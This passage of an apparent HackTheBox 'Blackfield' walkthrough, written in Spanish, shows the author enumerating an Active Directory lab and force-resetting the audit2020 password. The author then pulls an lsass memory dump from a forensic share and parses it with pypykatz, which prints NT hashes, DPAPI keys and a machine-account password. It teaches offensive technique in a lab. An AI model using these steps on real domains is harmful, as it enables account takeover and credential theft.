HTTP        10.129.126.69   5985   DC01             [*] http://10.129.126.69:5985/wsman
WINRM       10.129.126.69   5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
```

## Support Enumeration

- Vamos a listar los recursos compartidos nivel de red para ese usuario ya que tenemos credenciales validas.

```bash
➜  content smbmap -H 10.129.126.69 -u 'support' -p '#00^BlackKnight' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
```

- Vamos a ver si en `profiles$` hay algo interesante.

- Pero nada solo había carpetas para cada usuario y dentro no había nada.

```bash
➜  content smbmap -H 10.129.126.69 -u 'support' -p '#00^BlackKnight' -r 'profiles$/support/' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.126.69:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles$                                         	READ ONLY	
	./profiles$support/
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
```

- Vamos a usar `ldapdomaindump` para enumerar por ese protocolo.

```bash
➜  html ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.129.126.69
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

- Aquí tenemos los archivos que nos genera.

```bash
➜  html ll
total 1.4M
-rw-r--r-- 1 root root 2.7K Apr 19 19:41 domain_computers.grep
-rw-r--r-- 1 root root 6.1K Apr 19 19:41 domain_computers.html
-rw-r--r-- 1 root root  39K Apr 19 19:41 domain_computers.json
-rw-r--r-- 1 root root 6.4K Apr 19 19:41 domain_computers_by_os.html
-rw-r--r-- 1 root root  10K Apr 19 19:41 domain_groups.grep
-rw-r--r-- 1 root root  17K Apr 19 19:41 domain_groups.html
-rw-r--r-- 1 root root  78K Apr 19 19:41 domain_groups.json
-rw-r--r-- 1 root root  262 Apr 19 19:41 domain_policy.grep
-rw-r--r-- 1 root root 1.2K Apr 19 19:41 domain_policy.html
-rw-r--r-- 1 root root 6.0K Apr 19 19:41 domain_policy.json
-rw-r--r-- 1 root root   71 Apr 19 19:41 domain_trusts.grep
-rw-r--r-- 1 root root  828 Apr 19 19:41 domain_trusts.html
-rw-r--r-- 1 root root    2 Apr 19 19:41 domain_trusts.json
-rw-r--r-- 1 root root  62K Apr 19 19:41 domain_users.grep
-rw-r--r-- 1 root root 143K Apr 19 19:41 domain_users.html
-rw-r--r-- 1 root root 890K Apr 19 19:41 domain_users.json
-rw-r--r-- 1 root root 106K Apr 19 19:41 domain_users_by_group.html
-rw-r--r-- 1 root root  11K Feb  5 19:54 index.html
-rw-r--r-- 1 root root  615 Feb  5 19:57 index.nginx-debian.html
```

- Para poder verlos vamos habilitar el servidor de Apache2.

```bash
➜  html service apache2 start
```

- Ahora podemos ver cualquier archivo que queramos.

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/1.png">
</p>

- El usuario `svc_backup` pertenece al grupo `Remote Management Users`.

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/2.png">
</p>

## audit2020

- Bueno necesitamos su contraseña pero por el momento no conocemos vías para convertirnos en ese usuario así que vamos a usar `bloodhound`.

```bash
➜  bloodhound bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.129.23.192 -d blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 24S
```

- Podemos forzar a cambiarle la contraseña al usuario `AUDIT2020`.

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/3.png">
</p>

- Podemos usar `net`.

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/blackfield/4.png">
</p>

- Y con esto ya se supone que le cambiamos la contraseña.

```bash
➜  bloodhound net rpc password audit2020 -U 'support' -S 10.129.23.192
Enter new password for audit2020:
Password for [WORKGROUP\support]:
```

- Vamos a validar con `crackmapexec`.

```bash
➜  bloodhound crackmapexec smb 10.129.23.192 -u 'audit2020' -p 'miguel123$!z'
SMB         10.129.23.192   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.23.192   445    DC01             [+] BLACKFIELD.local\audit2020:miguel123$!z
```

- Vamos a validar los recursos compartidos por `smb`.

```bash
➜  bloodhound smbmap -H 10.129.23.192 -u 'audit2020' -p 'miguel123$!z' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
```

- Tenemos acceso a un directorio interesante `Forensic / Audit share`.

```bash
➜  bloodhound smbmap -H 10.129.23.192 -u 'audit2020' -p 'miguel123$!z' -r forensic --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensic
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	.
	dr--r--r--                0 Sun Feb 23 09:10:16 2020	..
	dr--r--r--                0 Sun Feb 23 12:14:37 2020	commands_output
	dr--r--r--                0 Thu May 28 15:29:24 2020	memory_analysis
	dr--r--r--                0 Fri Feb 28 16:30:34 2020	tools
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
```

- Y bueno dentro de una carpeta encontramos un `.zip` que ya es interesante `lsass.zip`.

```bash
➜  bloodhound smbmap -H 10.129.23.192 -u 'audit2020' -p 'miguel123$!z' -r forensic/memory_analysis --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.23.192:445	Name: BLACKFIELD.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	READ ONLY	Forensic / Audit share.
	./forensicmemory_analysis
	dr--r--r--                0 Thu May 28 15:29:24 2020	.
	dr--r--r--                0 Thu May 28 15:29:24 2020	..
	fr--r--r--         37876530 Thu May 28 15:29:24 2020	conhost.zip
	fr--r--r--         24962333 Thu May 28 15:29:24 2020	ctfmon.zip
	fr--r--r--         23993305 Thu May 28 15:29:24 2020	dfsrs.zip
	fr--r--r--         18366396 Thu May 28 15:29:24 2020	dllhost.zip
	fr--r--r--          8810157 Thu May 28 15:29:24 2020	ismserv.zip
	fr--r--r--         41936098 Thu May 28 15:29:24 2020	lsass.zip
	fr--r--r--         64288607 Thu May 28 15:29:24 2020	mmc.zip
	fr--r--r--         13332174 Thu May 28 15:29:24 2020	RuntimeBroker.zip
	fr--r--r--        131983313 Thu May 28 15:29:24 2020	ServerManager.zip
	fr--r--r--         33141744 Thu May 28 15:29:24 2020	sihost.zip
	fr--r--r--         33756344 Thu May 28 15:29:24 2020	smartscreen.zip
	fr--r--r--         14408833 Thu May 28 15:29:24 2020	svchost.zip
	fr--r--r--         34631412 Thu May 28 15:29:24 2020	taskhostw.zip
	fr--r--r--         14255089 Thu May 28 15:29:24 2020	winlogon.zip
	fr--r--r--          4067425 Thu May 28 15:29:24 2020	wlms.zip
	fr--r--r--         18303252 Thu May 28 15:29:24 2020	WmiPrvSE.zip
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	profiles$                                         	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share
```

## Shell as svc_backup

- <https://www.reviversoft.com/es/processes/lsass.exe?ncr=1>.

- Vamos a descárgalo a nuestra maquina.

```bash
➜  bloodhound smbmap -H 10.129.23.192 -u 'audit2020' -p 'miguel123$!z' --download forensic/memory_analysis/lsass.zip --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: forensic\memory_analysis\lsass.zip (41936098 bytes)
[+] File output to: /home/miguel/Hackthebox/Blackfield/content/bloodhound/10.129.23.192-forensic_memory_analysis_lsass.zip
```

- Dentro tenemos el archivo importante.

```bash
➜  content 7z l lsass.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 41936098 bytes (40 MiB)

Listing archive: lsass.zip

--
Path = lsass.zip
Type = zip
Physical Size = 41936098

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02 ....A    143044222     41935982  lsass.DMP
------------------- ----- ------------ ------------  ------------------------
2020-02-23 11:02:02          143044222     41935982  1 files
```

- Vamos a extraerlo.

```bash
➜  content unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP
```

- Ahora podemos usar la siguiente herramienta <https://sniferl4bs.com/2020/03/extrayendo-credenciales-de-un-volcado-de-memoria-de-lssas.exe-con-pypykatz/>.

- Vamos a obtener información privilegiada.

```bash
➜  content pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a89550
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [25869]==
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [633e3]==
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username:
		Domain:

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: NA
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
